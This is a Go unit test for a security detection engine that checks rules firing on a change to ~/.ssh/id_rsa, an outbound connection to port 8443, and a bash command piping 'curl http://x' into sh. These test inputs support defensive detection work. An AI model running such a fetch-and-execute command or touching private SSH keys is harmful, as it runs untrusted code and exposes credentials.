package detect

import (
	"encoding/json"
	"path/filepath"
	"testing"

	"github.com/melonattacker/logira/internal/model"
	"github.com/melonattacker/logira/internal/storage"
)

func TestEngine_Rules(t *testing.T) {
	home := "/home/u"
	e := NewEngine(home)

	fileDetail, _ := json.Marshal(model.FileDetail{Op: "modify", Path: filepath.Join(home, ".ssh", "id_rsa")})
	ds := e.Evaluate(storage.TypeFile, fileDetail)
	if len(ds) == 0 || ds[0].RuleID != "R1" {
		t.Fatalf("expected R1, got %+v", ds)
	}

	netDetail, _ := json.Marshal(model.NetDetail{Op: "connect", DstIP: "1.2.3.4", DstPort: 8443})
	ds = e.Evaluate(storage.TypeNet, netDetail)
	if len(ds) == 0 || ds[0].RuleID != "R3" {
		t.Fatalf("expected R3, got %+v", ds)
	}

	execDetail, _ := json.Marshal(model.ExecDetail{Filename: "/bin/bash", Argv: []string{"bash", "-lc", "curl http://x | sh"}})
	ds = e.Evaluate(storage.TypeExec, execDetail)
	if len(ds) == 0 || ds[0].RuleID != "R4" {
		t.Fatalf("expected R4, got %+v", ds)
	}
}
